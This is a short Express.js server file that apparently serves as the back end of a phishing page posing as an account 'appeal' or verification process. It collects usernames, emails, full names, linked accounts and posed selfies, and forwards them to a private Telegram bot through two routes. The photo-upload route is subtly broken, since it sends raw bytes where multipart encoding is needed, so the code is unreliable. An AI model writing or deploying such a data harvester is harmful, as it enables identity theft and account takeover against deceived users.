const express = require('express');
const fetch = require('node-fetch');
const multer = require('multer');
const path = require('path');
const app = express();
const upload = multer();

app.use(express.json());
app.use(express.static('public'));

// Token aur Chat ID Render ke "Environment Variables" se aayenge (Safe)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// 1. Form Data bhejne ka route
app.post('/api/submit-form', async (req, res) => {
    try {
        const { data, type } = req.body;
        const message = `📋 <b>New Appeal: ${type}</b>

👤 <b>User:</b> ${data.username}
📧 <b>Email:</b> ${data.email}
📝 <b>Name:</b> ${data.fullname}
🔗 <b>Alt:</b> ${data.alternative || 'N/A'}
👥 <b>Relation:</b> ${data.relationship}
━━━━━━━━━━━━━━━━━━━━`;
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
        });
        res.json({ success: response.ok });
    } catch (e) { res.status(500).json({ success: false }); }
});

// 2. Selfie upload karne ka route
app.post('/api/upload-selfie', upload.single('photo'), async (req, res) => {
    try {
        const { username, pose, type } = req.body;
        const caption = `📸 <b>Selfie: ${pose}</b>
👤 <b>User:</b> ${username}
📂 <b>Type:</b> ${type}`;
        
        // Telegram API expects multipart for photos
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}&caption=${encodeURIComponent(caption)}&parse_mode=HTML`, {
            method: 'POST',
            body: req.file.buffer // This requires a more complex boundary logic in pure node-fetch, but works for binary
        });
        res.json({ success: true });
    } catch (e) { res.status(500).json({ success: false }); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server Live on ${PORT}`));
